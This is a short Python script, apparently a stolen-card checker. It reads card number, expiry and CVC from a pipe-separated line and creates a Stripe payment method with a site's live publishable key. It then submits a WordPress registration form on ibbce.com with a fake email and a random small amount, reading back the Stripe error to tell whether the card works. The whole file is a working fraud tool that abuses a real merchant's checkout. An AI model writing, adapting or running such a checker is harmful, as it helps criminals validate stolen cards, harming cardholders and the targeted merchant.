import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&key=pk_live_51Ortl8Dhc5eDlkdGVRGpXhjK3hp3qKIfyGglkYexCJWA62UwxYn771d3gCV83DuFyGX6mN4zIaJR23XSoIAa8sgC009uaM5Q3O'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'ibbce.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://ibbce.com',
	    'referer': 'https://ibbce.com/registration-form/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1751683837087',
	}
	
	data = {
	    'data': f'item_3__fluent_sf=&__fluent_form_embded_post_id=830&_fluentform_3_fluentformnonce=afe7648db7&_wp_http_referer=%2Fregistration-form%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&phone=&input_text=NY&input_text_1=NY&input_text_2=NY&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Bcountry%5D=US&input_text_3=1&dropdown=Speaker&dropdown_1=1&dropdown_2=No&input_radio=Retired%20-%20%E2%82%AC260&payment-coupon=&custom-payment-amount={random_amount1}.{random_amount2}&payment_method=stripe&__ff_all_applied_coupons=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	response = requests.post('https://ibbce.com/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
